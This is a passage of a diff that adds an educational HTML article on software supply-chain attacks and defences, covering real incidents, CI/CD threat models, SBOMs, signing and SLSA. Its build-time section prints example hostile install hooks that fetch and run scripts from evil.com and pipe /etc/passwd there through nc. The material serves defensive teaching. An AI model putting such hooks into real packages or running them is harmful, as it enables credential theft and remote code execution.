+          Legitimate maintainers who turn malicious represent an existential threat to the trust model.
+        </p>
+        <p>
+          <strong>event-stream (2018)</strong>: A new maintainer was given publishing rights to the popular 
+          <code>event-stream</code> package (~2M weekly downloads). They added a dependency on 
+          <code>flatmap-stream</code> which contained obfuscated code targeting a specific Bitcoin wallet 
+          application (Copay). The attack was designed to steal cryptocurrency from high-value targets 
+          while remaining dormant in most environments.
+        </p>
+        <p>
+          <strong>XZ Utils (2024)</strong>: "Jia Tan" spent two years contributing legitimate patches to the 
+          xz compression library, gaining maintainer trust. The eventual backdoor targeted SSH authentication, 
+          potentially allowing unauthorized access to any system running affected versions. The sophistication 
+          suggested nation-state involvement.
+        </p>
+        <p>
+          <strong>Blast radius</strong>: Catastrophic. Trusted packages with large install bases affect 
+          millions of downstream systems. Detection is extremely difficult because the attacker has 
+          legitimate access.
+        </p>
+
+        <h3>4.3 Compromised Maintainer Accounts</h3>
+        <p>
+          Attackers compromise maintainer accounts through credential stuffing, phishing, or session hijacking.
+        </p>
+        <p>
+          <strong>ua-parser-js (2021)</strong>: The npm account for <code>ua-parser-js</code> (8M weekly downloads) 
+          was compromised. Attackers published versions containing a cryptominer and credential stealer. 
+          Three malicious versions existed for approximately 4 hours before removal.
+        </p>
+        <p>
+          <strong>coa and rc (2021)</strong>: Multiple npm packages had maintainer accounts compromised in a 
+          coordinated attack. The malicious code installed a Windows trojan.
+        </p>
+        <p>
+          <strong>Blast radius</strong>: High. Popular packages have wide reach. Time-to-detection determines 
+          impact — faster detection means fewer affected systems.
+        </p>
+
+        <h3>4.4 Protestware</h3>
+        <p>
+          Maintainers who sabotage their own packages for political or personal reasons.
+        </p>
+        <p>
+          <strong>colors and faker (2022)</strong>: Marak Squires, maintainer of <code>colors</code> 
+          (~20M weekly downloads) and <code>faker</code>, released updates that put both packages into 
+          infinite loops, breaking thousands of projects including AWS CDK. The action was protest against 
+          corporations using open source without compensation.
+        </p>
+        <p>
+          <strong>node-ipc (2022)</strong>: Following Russia's invasion of Ukraine, the maintainer added code 
+          that detected Russian and Belarusian IP addresses and overwrote files with heart emojis, causing 
+          data loss for affected users.
+        </p>
+        <p>
+          <strong>Blast radius</strong>: Variable. Protestware is often obvious (unlike stealthy malware) and 
+          detected quickly, but can cause significant disruption before remediation.
+        </p>
+
+        <h3>4.5 Build-Time Remote Code Execution</h3>
+        <p>
+          Packages that execute malicious code during installation, not at runtime.
+        </p>
+
+        <pre><code class="lang-json">// Malicious package.json
+{
+  "name": "totally-legit-package",
+  "version": "1.0.0",
+  "scripts": {
+    "preinstall": "curl https://evil.com/payload.sh | bash",
+    "postinstall": "node -e \"require('child_process').exec('cat /etc/passwd | nc evil.com 4444')\""
+  }
+}</code></pre>
+
+        <pre><code class="lang-python"># Malicious setup.py
+from setuptools import setup
+import os
+os.system("curl https://evil.com/steal.py | python3")
+setup(name="innocent-package", version="1.0.0")</code></pre>
+
+        <p>
+          <strong>Blast radius</strong>: Devastating for CI/CD. Build agents typically have access to cloud 
+          credentials, deployment keys, and artifact signing certificates. A single malicious install script 
+          can exfiltrate all secrets in the environment.
+        </p>
+
+        <h3>4.6 Supply Chain Poisoning</h3>
+        <p>
+          Attacks that compromise the build infrastructure of legitimate packages, injecting malicious 
+          code without maintainer knowledge.
+        </p>
+        <p>
+          <strong>SolarWinds (2020)</strong>: Attackers compromised SolarWinds' build system, injecting 
+          the SUNBURST backdoor into signed Orion software updates. The malicious code was distributed 
+          to ~18,000 organizations including US government agencies and Fortune 500 companies.
+        </p>
+        <p>
+          <strong>Codecov (2021)</strong>: Attackers modified the Codecov bash uploader script hosted on 
+          codecov.io. The script, executed in CI pipelines, exfiltrated environment variables (including 
+          secrets) to attacker infrastructure for two months.
+        </p>
+        <p>
+          <strong>Blast radius</strong>: Maximum. Signed, trusted software becomes the attack vector. 
+          Detection is nearly impossible because the malicious code appears legitimate.
+        </p>
+
+        <h3>4.7 Attack Summary Matrix</h3>
+
+        <table>
+          <thead>
+            <tr><th>Attack Type</th><th>Detection Difficulty</th><th>Typical Blast Radius</th><th>Primary Defense</th></tr>
+          </thead>
+          <tbody>
+            <tr><td>Dependency Confusion</td><td>Medium</td><td>Targeted orgs</td><td>Registry configuration</td></tr>
+            <tr><td>Typosquatting</td><td>Low</td><td>Careless users</td><td>Lockfiles, review</td></tr>
+            <tr><td>Malicious Maintainer</td><td>Very High</td><td>All downstream</td><td>Behavioral analysis, SBOM</td></tr>
+            <tr><td>Account Compromise</td><td>Medium</td><td>All downstream</td><td>MFA, token rotation</td></tr>
+            <tr><td>Protestware</td><td>Low</td><td>All downstream</td><td>Version pinning</td></tr>
+            <tr><td>Build-time RCE</td><td>Medium</td><td>Build infra</td><td>Sandboxed builds</td></tr>
+            <tr><td>Supply Chain Poisoning</td><td>Very High</td><td>All customers</td><td>Reproducible builds</td></tr>
+          </tbody>
+        </table>
+        <p class="diagram-label">Tab. 4 — Supply chain attack taxonomy with detection difficulty and primary defenses.</p>
+
+        <!-- ============================================================ -->
+        <h2>5. CI/CD Pipeline Attack Surface Analysis.</h2>
+        <!-- ============================================================ -->
+
+        <p>
+          CI/CD pipelines are high-value targets because they combine <strong>privileged access</strong> 
+          (secrets, deployment credentials), <strong>automated execution</strong> (no human in the loop), 
+          and <strong>dependency resolution</strong> (external code execution). This section analyzes 
+          the attack surface across major platforms.
+        </p>
+
+        <h3>5.1 GitHub Actions Threat Model</h3>
+
+        <pre><code class="lang-yaml"># Typical vulnerable workflow
+name: Build and Deploy
+on: [push, pull_request]
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      
+      - name: Install dependencies
+        run: npm install  # ← External code execution
+        
+      - name: Build
+        run: npm run build
+        
+      - name: Deploy
+        env:
+          AWS_ACCESS_KEY_ID: ${{ secrets.AWS_KEY }}      # ← Secrets exposed
+          AWS_SECRET_ACCESS_KEY: ${{ secrets.AWS_SECRET }}
+        run: aws s3 sync dist/ s3://production-bucket/</code></pre>
+
+        <p>
+          <strong>Attack vectors</strong>:
+        </p>
+        <ul>
+          <li><strong>Workflow injection</strong>: Malicious PRs modifying .github/workflows/ (if workflows run on PRs)</li>
+          <li><strong>Script injection</strong>: Untrusted input in <code>run:</code> blocks (e.g., <code>${{ github.event.issue.title }}</code>)</li>
+          <li><strong>Dependency execution</strong>: npm install running attacker code with access to secrets</li>
+          <li><strong>Action supply chain</strong>: Compromised third-party actions (<code>uses: attacker/evil-action@v1</code>)</li>
+          <li><strong>Runner compromise</strong>: Self-hosted runners with persistent access to corporate networks</li>
+        </ul>
+
+        <h3>5.2 GitLab CI Threat Model</h3>
+
+        <pre><code class="lang-yaml"># .gitlab-ci.yml
+stages:
+  - build
+  - deploy
+
+build:
+  stage: build
+  image: node:18  # ← Docker image supply chain
+  script:
+    - npm ci       # ← Dependency execution
+    - npm run build
+  artifacts:
+    paths:
+      - dist/
+
+deploy:
+  stage: deploy
+  script:
+    - aws s3 sync dist/ s3://production/
+  variables:
+    AWS_ACCESS_KEY_ID: $AWS_KEY  # ← CI variable exposure</code></pre>
+
+        <p>
+          <strong>Additional GitLab vectors</strong>:
+        </p>
+        <ul>
+          <li><strong>Shared runners</strong>: Multi-tenant runners may leak information between projects</li>
+          <li><strong>Container escapes</strong>: Privileged containers can escape to host</li>
+          <li><strong>Cache poisoning</strong>: Malicious artifacts persisted in CI caches</li>
+          <li><strong>Pipeline triggers</strong>: External triggers with injected variables</li>
+        </ul>
+
+        <h3>5.3 Jenkins Threat Model</h3>
+        <p>
+          Jenkins, being self-hosted and highly configurable, has the largest attack surface:
+        </p>
+        <ul>
+          <li><strong>Plugin vulnerabilities</strong>: Jenkins has 1,800+ plugins with varying security quality</li>
+          <li><strong>Groovy sandboxing</strong>: Pipeline scripts can escape the Groovy sandbox</li>
+          <li><strong>Credential storage</strong>: Secrets stored in Jenkins accessible to all jobs</li>
+          <li><strong>Agent compromise</strong>: Permanent build agents accumulate credentials and artifacts</li>
+          <li><strong>Admin access</strong>: Jenkins admins can access all secrets and modify all pipelines</li>
+        </ul>
+
+        <h3>5.4 CI/CD Attack Chain Diagram</h3>
+
+        <div class="diagram-container">
+          <svg viewBox="0 0 720 440" xmlns="http://www.w3.org/2000/svg">
+            <style>
+              .ci-box { fill: #f5f5f0; stroke: #888880; stroke-width: 1.5; }
+              .ci-bad { fill: #fff5f5; stroke: #c96442; stroke-width: 2; }
+              .ci-label { fill: #1a1a1a; font-family: 'Kalam', cursive; font-size: 11px; }
+              .ci-detail { fill: #555555; font-family: 'Kalam', cursive; font-size: 9px; }
+              .ci-bad-label { fill: #c96442; font-family: 'Kalam', cursive; font-size: 10px; font-weight: bold; }
+              .ci-arrow { stroke: #666660; stroke-width: 1.5; fill: none; marker-end: url(#ci-arr); }
+              .ci-arrow-bad { stroke: #c96442; stroke-width: 2; fill: none; marker-end: url(#ci-arr-bad); stroke-dasharray: 5,3; }
+            </style>
+            <defs>
+              <marker id="ci-arr" markerWidth="8" markerHeight="6" refX="8" refY="3" orient="auto">
+                <polygon points="0 0, 8 3, 0 6" fill="#666660"/>
+              </marker>
+              <marker id="ci-arr-bad" markerWidth="8" markerHeight="6" refX="8" refY="3" orient="auto">
+                <polygon points="0 0, 8 3, 0 6" fill="#c96442"/>
+              </marker>
+            </defs>
+            
+            <!-- Initial Access -->
+            <rect x="20" y="20" width="150" height="70" rx="4" class="ci-bad"/>
+            <text x="95" y="45" text-anchor="middle" class="ci-label">Initial Access</text>
+            <text x="95" y="62" text-anchor="middle" class="ci-detail">Malicious dependency</text>
+            <text x="95" y="75" text-anchor="middle" class="ci-detail">Compromised action</text>
+            
+            <!-- Code Execution -->
+            <rect x="200" y="20" width="150" height="70" rx="4" class="ci-bad"/>
+            <text x="275" y="45" text-anchor="middle" class="ci-label">Execution</text>
+            <text x="275" y="62" text-anchor="middle" class="ci-detail">postinstall script</text>
+            <text x="275" y="75" text-anchor="middle" class="ci-detail">build.rs / setup.py</text>
+            
+            <!-- Credential Access -->
+            <rect x="380" y="20" width="150" height="70" rx="4" class="ci-bad"/>
+            <text x="455" y="45" text-anchor="middle" class="ci-label">Credential Access</text>
+            <text x="455" y="62" text-anchor="middle" class="ci-detail">${{ secrets.* }}</text>
+            <text x="455" y="75" text-anchor="middle" class="ci-detail">ENV vars, .npmrc</text>
+            
+            <!-- Exfiltration -->
+            <rect x="560" y="20" width="140" height="70" rx="4" class="ci-bad"/>
+            <text x="630" y="45" text-anchor="middle" class="ci-label">Exfiltration</text>
+            <text x="630" y="62" text-anchor="middle" class="ci-detail">DNS tunneling</text>
+            <text x="630" y="75" text-anchor="middle" class="ci-detail">HTTPS to C2</text>
+            
+            <!-- Arrows top row -->
+            <path d="M 170 55 L 195 55" class="ci-arrow-bad"/>
+            <path d="M 350 55 L 375 55" class="ci-arrow-bad"/>
+            <path d="M 530 55 L 555 55" class="ci-arrow-bad"/>
+            
+            <!-- Lateral Movement -->
+            <rect x="20" y="130" width="150" height="70" rx="4" class="ci-bad"/>
+            <text x="95" y="155" text-anchor="middle" class="ci-label">Lateral Movement</text>
+            <text x="95" y="172" text-anchor="middle" class="ci-detail">AWS credentials →</text>
+            <text x="95" y="185" text-anchor="middle" class="ci-detail">cloud account access</text>
+            
+            <!-- Artifact Poisoning -->
+            <rect x="200" y="130" width="150" height="70" rx="4" class="ci-bad"/>
+            <text x="275" y="155" text-anchor="middle" class="ci-label">Artifact Poisoning</text>
+            <text x="275" y="172" text-anchor="middle" class="ci-detail">Inject backdoor into</text>
+            <text x="275" y="185" text-anchor="middle" class="ci-detail">built artifacts</text>
+            
+            <!-- Persistence -->
+            <rect x="380" y="130" width="150" height="70" rx="4" class="ci-bad"/>
+            <text x="455" y="155" text-anchor="middle" class="ci-label">Persistence</text>
+            <text x="455" y="172" text-anchor="middle" class="ci-detail">Modify workflow files</text>
+            <text x="455" y="185" text-anchor="middle" class="ci-detail">Cache poisoning</text>
+            
+            <!-- Production Compromise -->
+            <rect x="560" y="130" width="140" height="70" rx="4" class="ci-bad"/>
+            <text x="630" y="155" text-anchor="middle" class="ci-label">Production</text>
+            <text x="630" y="172" text-anchor="middle" class="ci-detail">Deploy backdoored</text>
+            <text x="630" y="185" text-anchor="middle" class="ci-detail">application</text>
+            
+            <!-- Vertical arrows -->
+            <path d="M 95 90 L 95 125" class="ci-arrow-bad"/>
+            <path d="M 275 90 L 275 125" class="ci-arrow-bad"/>
+            <path d="M 455 90 L 455 125" class="ci-arrow-bad"/>
+            <path d="M 630 90 L 630 125" class="ci-arrow-bad"/>
+            
+            <!-- Horizontal arrows second row -->
+            <path d="M 170 165 L 195 165" class="ci-arrow-bad"/>
+            <path d="M 350 165 L 375 165" class="ci-arrow-bad"/>
+            <path d="M 530 165 L 555 165" class="ci-arrow-bad"/>
+            
+            <!-- Impact boxes -->
+            <rect x="20" y="240" width="680" height="180" rx="4" class="ci-box"/>
+            <text x="360" y="265" text-anchor="middle" class="ci-label" style="font-weight: bold;">Downstream Impact</text>
+            
+            <rect x="40" y="280" width="200" height="60" rx="3" class="ci-bad"/>
+            <text x="140" y="300" text-anchor="middle" class="ci-bad-label">Cloud Account Takeover</text>
+            <text x="140" y="318" text-anchor="middle" class="ci-detail">IAM escalation, S3 access,</text>
+            <text x="140" y="330" text-anchor="middle" class="ci-detail">RDS credentials, Secrets Manager</text>
+            
+            <rect x="260" y="280" width="200" height="60" rx="3" class="ci-bad"/>
+            <text x="360" y="300" text-anchor="middle" class="ci-bad-label">Container Registry Poisoning</text>
+            <text x="360" y="318" text-anchor="middle" class="ci-detail">Push malicious images,</text>
+            <text x="360" y="330" text-anchor="middle" class="ci-detail">modify :latest tags</text>
+            
+            <rect x="480" y="280" width="200" height="60" rx="3" class="ci-bad"/>
+            <text x="580" y="300" text-anchor="middle" class="ci-bad-label">Source Code Theft</text>
+            <text x="580" y="318" text-anchor="middle" class="ci-detail">Clone private repos,</text>
+            <text x="580" y="330" text-anchor="middle" class="ci-detail">exfil IP and secrets</text>
+            
+            <rect x="40" y="350" width="200" height="60" rx="3" class="ci-bad"/>
+            <text x="140" y="370" text-anchor="middle" class="ci-bad-label">Signing Key Compromise</text>
+            <text x="140" y="388" text-anchor="middle" class="ci-detail">Steal code signing keys,</text>
+            <text x="140" y="400" text-anchor="middle" class="ci-detail">publish trusted malware</text>
+            
+            <rect x="260" y="350" width="200" height="60" rx="3" class="ci-bad"/>
+            <text x="360" y="370" text-anchor="middle" class="ci-bad-label">Internal Network Pivot</text>
+            <text x="360" y="388" text-anchor="middle" class="ci-detail">Self-hosted runners →</text>
+            <text x="360" y="400" text-anchor="middle" class="ci-detail">corporate network access</text>
+            
+            <rect x="480" y="350" width="200" height="60" rx="3" class="ci-bad"/>
+            <text x="580" y="370" text-anchor="middle" class="ci-bad-label">Customer Data Breach</text>
+            <text x="580" y="388" text-anchor="middle" class="ci-detail">Production DB access,</text>
+            <text x="580" y="400" text-anchor="middle" class="ci-detail">PII exfiltration</text>
+          </svg>
+          <p class="diagram-label">Fig. 4 — CI/CD attack chain showing progression from initial dependency compromise to full production breach.</p>
+        </div>
+
+        <h3>5.5 Self-Hosted Runner Risks</h3>
+        <p>
+          Self-hosted runners (GitHub Actions, GitLab, Jenkins agents) introduce additional risks:
+        </p>
+        <table>
+          <thead>
+            <tr><th>Risk</th><th>Description</th><th>Mitigation</th></tr>
+          </thead>
+          <tbody>
+            <tr><td>Persistence</td><td>Malware survives between jobs</td><td>Ephemeral runners, container isolation</td></tr>
+            <tr><td>Credential accumulation</td><td>Cached credentials from previous jobs</td><td>Clean workspace between runs</td></tr>
+            <tr><td>Network access</td><td>Runners inside corporate network</td><td>Network segmentation, firewall rules</td></tr>
+            <tr><td>Shared secrets</td><td>All jobs access same runner secrets</td><td>Per-job OIDC tokens, no static secrets</td></tr>
+            <tr><td>Container escapes</td><td>Privileged containers → host access</td><td>rootless containers, gVisor/Kata</td></tr>
+          </tbody>
+        </table>
+        <p class="diagram-label">Tab. 5 — Self-hosted runner security risks and mitigations.</p>
+
+        <h3>5.6 Secured CI/CD Configuration</h3>
+
+        <pre><code class="lang-yaml"># Hardened GitHub Actions workflow
+name: Secure Build
+on:
+  push:
+    branches: [main]
+  # NO pull_request trigger - avoid running untrusted code with secrets
+
+permissions:
+  contents: read  # Minimal permissions
+  
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      
+      # Pin action versions by SHA, not tag
+      - uses: actions/setup-node@8f152de45cc393bb48ce5d89d36b731f54556e65  # v4.0.0
+        with:
+          node-version: '20'
+          
+      # Use npm ci (not npm install) with frozen lockfile
+      - run: npm ci --ignore-scripts  # Disable postinstall scripts
+      
+      # If scripts needed, run in isolated environment
+      - name: Build (sandboxed)
+        run: |
+          # Run with minimal capabilities
+          unshare --net --user npm run build
+          
+  deploy:
+    needs: build
+    runs-on: ubuntu-latest
+    # OIDC authentication - no static credentials
+    permissions:
+      id-token: write
+      contents: read
+    steps:
+      - uses: aws-actions/configure-aws-credentials@v4
+        with:
+          role-to-assume: arn:aws:iam::123456789:role/GitHubActionsRole
+          aws-region: us-east-1
+      # No AWS_ACCESS_KEY_ID in secrets!</code></pre>
+
+        <!-- ============================================================ -->
+        <h2>6. Software Bill of Materials (SBOM).</h2>
+        <!-- ============================================================ -->
+
+        <p>
+          An SBOM is a machine-readable inventory of all components in a software artifact — 
+          every library, framework, and dependency with version, supplier, and relationship information. 
+          Think of it as a nutritional label for software.
+        </p>
+
+        <h3>6.1 Why SBOMs Matter</h3>
+        <p>
+          Without an SBOM, answering "Are we affected by Log4Shell?" requires manual investigation 
+          across every application, build artifact, and container image. With SBOMs, it's a database query.
+        </p>
+        <p>
+          <strong>Regulatory drivers</strong>:
+        </p>
+        <ul>
+          <li><strong>Executive Order 14028</strong> (2021): US federal agencies must require SBOMs from software vendors</li>
+          <li><strong>EU Cyber Resilience Act</strong> (2024): SBOM required for products sold in EU</li>
+          <li><strong>FDA Guidance</strong>: Medical device manufacturers must provide SBOMs</li>
+          <li><strong>NTIA Minimum Elements</strong>: Defines baseline SBOM requirements</li>
+        </ul>
+
+        <h3>6.2 SBOM Formats</h3>
+
+        <table>
+          <thead>
+            <tr><th>Format</th><th>Organization</th><th>Strengths</th><th>Use Cases</th></tr>
+          </thead>
+          <tbody>
+            <tr><td>SPDX</td><td>Linux Foundation</td><td>ISO standard (ISO/IEC 5962:2021), license compliance focus</td><td>Legal/compliance, open source projects</td></tr>
+            <tr><td>CycloneDX</td><td>OWASP</td><td>Security focus, VEX support, lightweight</td><td>Security tooling, DevSecOps</td></tr>
+            <tr><td>SWID</td><td>ISO/IEC</td><td>Software identification standard</td><td>Enterprise asset management</td></tr>
+          </tbody>
+        </table>
+        <p class="diagram-label">Tab. 6 — Major SBOM formats and their primary use cases.</p>
+
+        <h3>6.3 SBOM Generation</h3>
+
+        <pre><code class="lang-bash"># Syft — Anchore's SBOM generator
+# Generate SBOM from container image
+syft alpine:latest -o spdx-json > sbom.spdx.json
+syft alpine:latest -o cyclonedx-json > sbom.cdx.json
+
+# Generate from directory
+syft dir:/path/to/project -o spdx-json
+
+# Generate from archive
+syft /path/to/app.tar.gz</code></pre>
+
+        <pre><code class="lang-bash"># Trivy — Aqua Security's scanner (includes SBOM)
+trivy image --format spdx-json alpine:latest > sbom.spdx.json
+trivy fs --format cyclonedx /path/to/project > sbom.cdx.json
+
+# SBOM + vulnerability scan in one
+trivy image --format json --scanners vuln alpine:latest</code></pre>
+
+        <pre><code class="lang-bash"># npm — native SBOM support (v9+)
+npm sbom --sbom-format spdx > sbom.spdx.json
+npm sbom --sbom-format cyclonedx > sbom.cdx.json
+
+# pip-tools + cyclonedx-py
+pip-compile requirements.in
+cyclonedx-py requirements --format json > sbom.cdx.json</code></pre>
+
+        <h3>6.4 SBOM Architecture in CI/CD</h3>
+
+        <div class="diagram-container">
+          <svg viewBox="0 0 720 320" xmlns="http://www.w3.org/2000/svg">
+            <style>
+              .sbom-box { fill: #f5f5f0; stroke: #888880; stroke-width: 1.5; }
+              .sbom-good { fill: #f0fff0; stroke: #5a8a5a; stroke-width: 1.5; }
+              .sbom-label { fill: #1a1a1a; font-family: 'Kalam', cursive; font-size: 11px; }
+              .sbom-detail { fill: #555555; font-family: 'Kalam', cursive; font-size: 9px; }
+              .sbom-arrow { stroke: #666660; stroke-width: 1.5; fill: none; marker-end: url(#sbom-arr); }
+            </style>
+            <defs>
+              <marker id="sbom-arr" markerWidth="8" markerHeight="6" refX="8" refY="3" orient="auto">
+                <polygon points="0 0, 8 3, 0 6" fill="#666660"/>
+              </marker>
+            </defs>
+            
+            <!-- Source -->
+            <rect x="20" y="40" width="100" height="60" rx="4" class="sbom-box"/>
+            <text x="70" y="65" text-anchor="middle" class="sbom-label">Source</text>
+            <text x="70" y="82" text-anchor="middle" class="sbom-detail">package.json</text>
+            <text x="70" y="94" text-anchor="middle" class="sbom-detail">Dockerfile</text>
+            
+            <!-- Build -->
+            <rect x="160" y="40" width="100" height="60" rx="4" class="sbom-box"/>
+            <text x="210" y="65" text-anchor="middle" class="sbom-label">Build</text>
+            <text x="210" y="82" text-anchor="middle" class="sbom-detail">npm ci</text>
+            <text x="210" y="94" text-anchor="middle" class="sbom-detail">docker build</text>
+            
+            <!-- SBOM Gen -->
+            <rect x="300" y="40" width="100" height="60" rx="4" class="sbom-good"/>
+            <text x="350" y="65" text-anchor="middle" class="sbom-label">SBOM Gen</text>
+            <text x="350" y="82" text-anchor="middle" class="sbom-detail">syft / trivy</text>
+            <text x="350" y="94" text-anchor="middle" class="sbom-detail">cyclonedx</text>
+            
+            <!-- Sign -->
+            <rect x="440" y="40" width="100" height="60" rx="4" class="sbom-good"/>
+            <text x="490" y="65" text-anchor="middle" class="sbom-label">Sign</text>
+            <text x="490" y="82" text-anchor="middle" class="sbom-detail">cosign</text>
+            <text x="490" y="94" text-anchor="middle" class="sbom-detail">in-toto</text>
+            
+            <!-- Store -->
+            <rect x="580" y="40" width="120" height="60" rx="4" class="sbom-box"/>
+            <text x="640" y="65" text-anchor="middle" class="sbom-label">Artifact Store</text>
+            <text x="640" y="82" text-anchor="middle" class="sbom-detail">image + SBOM</text>
+            <text x="640" y="94" text-anchor="middle" class="sbom-detail">+ attestation</text>
+            
+            <!-- Arrows top row -->
+            <path d="M 120 70 L 155 70" class="sbom-arrow"/>
+            <path d="M 260 70 L 295 70" class="sbom-arrow"/>
+            <path d="M 400 70 L 435 70" class="sbom-arrow"/>
+            <path d="M 540 70 L 575 70" class="sbom-arrow"/>
+            
+            <!-- Analysis -->
+            <rect x="300" y="140" width="220" height="160" rx="4" class="sbom-box"/>
+            <text x="410" y="165" text-anchor="middle" class="sbom-label">Continuous Analysis</text>
+            
+            <rect x="320" y="180" width="180" height="35" rx="2" class="sbom-good"/>
+            <text x="410" y="200" text-anchor="middle" class="sbom-detail">Vulnerability scanning (Grype, Trivy)</text>
+            
+            <rect x="320" y="225" width="180" height="35" rx="2" class="sbom-good"/>
+            <text x="410" y="245" text-anchor="middle" class="sbom-detail">License compliance check</text>
+            
+            <rect x="320" y="270" width="180" height="25" rx="2" class="sbom-good"/>
+            <text x="410" y="287" text-anchor="middle" class="sbom-detail">Dependency drift detection</text>
+            
+            <!-- Arrow to analysis -->
+            <path d="M 640 100 L 640 150 L 525 150 L 525 180" class="sbom-arrow"/>
+            
+            <!-- Vuln DB -->
+            <rect x="580" y="160" width="120" height="50" rx="4" class="sbom-box"/>
+            <text x="640" y="182" text-anchor="middle" class="sbom-label">Vuln Database</text>
+            <text x="640" y="198" text-anchor="middle" class="sbom-detail">NVD, OSV, GitHub</text>
+            
+            <path d="M 580 190 L 520 210" class="sbom-arrow"/>
+            
+            <!-- Alert -->
+            <rect x="580" y="240" width="120" height="50" rx="4" class="sbom-box"/>
+            <text x="640" y="262" text-anchor="middle" class="sbom-label">Alerts</text>
+            <text x="640" y="278" text-anchor="middle" class="sbom-detail">Slack, PagerDuty</text>
+            
+            <path d="M 520 260 L 575 260" class="sbom-arrow"/>
+          </svg>
+          <p class="diagram-label">Fig. 5 — SBOM integration architecture showing generation, signing, storage, and continuous analysis.</p>
+        </div>
+
+        <h3>6.5 VEX: Vulnerability Exploitability eXchange</h3>
+        <p>
+          An SBOM tells you what components exist. A <strong>VEX</strong> document tells you whether 
+          a vulnerability in a component is actually exploitable in your specific context.
+        </p>
+        <p>
+          Log4Shell (CVE-2021-44228) affected log4j 2.x. But if your application uses log4j 
+          only for file-based logging with no user input reaching the logger, you might not be 
+          exploitable. VEX lets you document this:
+        </p>
+
+        <pre><code class="lang-json">{
+  "@context": "https://openvex.dev/ns",
+  "@type": "VexDocument",
+  "statements": [{
+    "vulnerability": { "@id": "CVE-2021-44228" },
+    "products": [{ "@id": "pkg:maven/com.example/myapp@1.0.0" }],
+    "status": "not_affected",
+    "justification": "vulnerable_code_not_in_execute_path",
+    "statement": "Application does not pass user-controlled input to log4j"
+  }]
+}</code></pre>
+
+        <!-- ============================================================ -->
+        <h2>7. Modern Dependency Security Controls.</h2>
+        <!-- ============================================================ -->
+
+        <p>
+          Defense-in-depth for dependency management requires multiple overlapping controls. 
+          No single measure is sufficient.
+        </p>
+
+        <h3>7.1 Private Artifact Registries</h3>
+        <p>
+          Run internal registries (Artifactory, Nexus, Azure Artifacts) that proxy public registries 
+          with caching and policy enforcement:
+        </p>
+        <ul>
+          <li><strong>Allowlisting</strong>: Only permit pre-approved packages</li>
+          <li><strong>Vulnerability blocking</strong>: Reject packages with critical CVEs</li>
+          <li><strong>License filtering</strong>: Block GPL in proprietary projects</li>
+          <li><strong>Audit logging</strong>: Track all package downloads</li>
+          <li><strong>Air-gapping</strong>: Completely disconnect from public registries</li>
+        </ul>
+
+        <h3>7.2 Dependency Pinning and Lockfiles</h3>
+
+        <pre><code class="lang-bash"># npm: package-lock.json (or npm-shrinkwrap.json for publishing)
+npm ci  # Uses lockfile exactly, fails if lockfile missing or out of sync
+
+# pip: pip-tools with hashes
+pip-compile --generate-hashes requirements.in
+pip install --require-hashes -r requirements.txt
+
+# Go: go.sum contains cryptographic checksums
+go mod verify  # Verifies checksums match
+
+# Maven: dependency:tree + versions-maven-plugin
+mvn versions:lock-snapshots
+mvn dependency:resolve -DincludeScope=runtime</code></pre>
+
+        <h3>7.3 Package Signing and Verification</h3>
+
+        <pre><code class="lang-bash"># Sigstore / Cosign — keyless signing with OIDC identity
+# Sign container image
+cosign sign --yes ghcr.io/myorg/myapp:v1.0.0
+
+# Verify signature
+cosign verify ghcr.io/myorg/myapp:v1.0.0 \
+  --certificate-identity=workflow@github.com \
+  --certificate-oidc-issuer=https://token.actions.githubusercontent.com
+
+# Sign SBOM and attach to image
+cosign attest --predicate sbom.cdx.json \
+  --type cyclonedx ghcr.io/myorg/myapp:v1.0.0
+
+# Verify attestation
+cosign verify-attestation ghcr.io/myorg/myapp:v1.0.0 \
+  --type cyclonedx</code></pre>
+
+        <h3>7.4 SLSA Framework</h3>
+        <p>
+          <strong>SLSA</strong> (Supply-chain Levels for Software Artifacts) is a security framework 
+          defining increasingly rigorous supply chain integrity guarantees:
+        </p>
+
+        <table>
+          <thead>
+            <tr><th>Level</th><th>Requirements</th><th>Protection</th></tr>
+          </thead>
+          <tbody>
+            <tr><td>SLSA 1</td><td>Build process documented</td><td>Provides provenance for debugging</td></tr>
+            <tr><td>SLSA 2</td><td>Hosted build platform, signed provenance</td><td>Prevents tampering after build</td></tr>
+            <tr><td>SLSA 3</td><td>Hardened build platform, non-falsifiable provenance</td><td>Prevents build compromise</td></tr>
+            <tr><td>SLSA 4</td><td>Two-person review, hermetic builds</td><td>Prevents insider threats</td></tr>
+          </tbody>
+        </table>
+        <p class="diagram-label">Tab. 7 — SLSA levels and their security guarantees.</p>
+
+        <pre><code class="lang-yaml"># GitHub Actions SLSA 3 provenance generator
+name: SLSA Build
+on: [push]
+
+jobs:
+  build:
+    outputs:
+      digest: ${{ steps.build.outputs.digest }}
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - id: build
+        run: |
+          # Build your artifact
+          go build -o myapp
+          echo "digest=$(sha256sum myapp | cut -d' ' -f1)" >> $GITHUB_OUTPUT
+          
+  provenance:
+    needs: build
+    uses: slsa-framework/slsa-github-generator/.github/workflows/generator_generic_slsa3.yml@v1.9.0
+    with:
+      base64-subjects: "${{ needs.build.outputs.digest }}"</code></pre>
+
+        <h3>7.5 Hermetic and Reproducible Builds</h3>
+        <p>
+          <strong>Hermetic builds</strong> have no network access during build — all dependencies 
+          must be pre-fetched and verified. This prevents build-time supply chain attacks.
+        </p>
+        <p>
+          <strong>Reproducible builds</strong> produce identical outputs from identical inputs. 
+          Anyone can verify an artifact was built from claimed source code.
+        </p>
+
+        <pre><code class="lang-dockerfile"># Dockerfile for hermetic build
+FROM golang:1.22 AS builder
+
+# Pre-fetch dependencies in separate layer
+WORKDIR /app
+COPY go.mod go.sum ./
+RUN go mod download && go mod verify
+
+# Build with network disabled
+COPY . .
+RUN --network=none CGO_ENABLED=0 go build -ldflags="-s -w" -o /myapp
+
+FROM scratch
+COPY --from=builder /myapp /myapp
+ENTRYPOINT ["/myapp"]</code></pre>
+
+        <pre><code class="lang-bash"># Bazel — designed for hermetic, reproducible builds
+# BUILD file
+load("@io_bazel_rules_go//go:def.bzl", "go_binary")
+
+go_binary(
+    name = "myapp",
+    srcs = ["main.go"],
+    deps = ["@com_github_pkg_errors//:go_default_library"],
+    # Bazel fetches deps from locked WORKSPACE, builds hermetically
+)</code></pre>
+
+        <h3>7.6 in-toto Attestations</h3>
+        <p>
+          <strong>in-toto</strong> is a framework for cryptographically verifying the integrity of 
